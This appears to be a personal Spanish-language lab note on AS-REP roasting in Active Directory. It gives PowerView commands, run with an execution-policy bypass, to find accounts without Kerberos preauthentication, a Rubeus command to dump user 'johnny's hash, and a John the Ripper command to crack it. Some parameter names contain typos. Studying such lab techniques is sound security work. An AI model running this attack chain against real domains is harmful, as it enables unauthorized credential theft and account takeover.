
AS-REP es una técnica que utiliza el hecho de que algunos usuarios no requieren de una preautenticación de kerberos.

Un atacante descubre estos usuarios vulnerables lanzando la query de usuarios con "Do not require Kerberos preauthentication".

ejemplo de ataque:

```PowerShell
cd C:\tools
powershell -ep bypass
. .\PowerView.ps1
Get-Domainuser | Where-Object { $_-UserAccountControl -like "*DONT_REQ_PREATH*" }
```

![[Pasted image 20250321102818.png]]

Como vemos el usuario johnny tiene este permiso asignado, asi que le vamos a hacer un ataque con la herramienta Rubeus

```PowerShell
.\Rubeus.exe asreproast /usr:johnny /oufile:johnnyhash.txt
```

![[Pasted image 20250321103053.png]]

Ahora ya tenemos el hash de johnny, vamos a utilizar john the ripper para poder crackearlo. Lo tenemos dentro de tools, en un zip (dentro de la carpeta run hay un .exe).

```PowerShell
.\john.exe .\johnnyhash.txt --format=krb5asrep --wordlist=.\10k-worst-pass.txt
```

![[Pasted image 20250321103610.png]]

